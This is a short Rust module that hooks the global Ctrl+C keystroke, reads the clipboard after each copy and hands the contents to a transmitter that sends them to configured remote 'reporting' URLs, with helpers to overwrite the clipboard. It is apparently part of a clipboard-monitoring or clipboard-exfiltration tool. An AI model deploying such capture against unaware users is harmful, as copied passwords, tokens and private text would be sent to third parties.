use copypasta::{ClipboardContext, ClipboardProvider};
use mki::Keyboard;
use std::{thread, time::Duration};

use crate::transmitter::transmit_clipboard;

pub fn register_clipboard_hook(wait_time: Duration, reporting_urls: Vec<String>) {
    println!("Sending clipboard contents to: {:?}", reporting_urls);

    mki::register_hotkey(&[Keyboard::LeftControl, Keyboard::C], move || {
        //Wait until the system has copied the text to the clipboard
        thread::sleep(wait_time);

        let clipboard_contents = read_clipboard();

        //Send the clipboard contents to the listeners
        transmit_clipboard(clipboard_contents, reporting_urls.clone());
    });
}

// Extract the clipboard contents
pub fn read_clipboard() -> String {
    let mut ctx = ClipboardContext::new().unwrap();
    ctx.get_contents().unwrap()
}

// Update the clipboard contents
pub fn write_clipboard(text: String) {
    let mut ctx = ClipboardContext::new().unwrap();
    ctx.set_contents(text).unwrap();
}
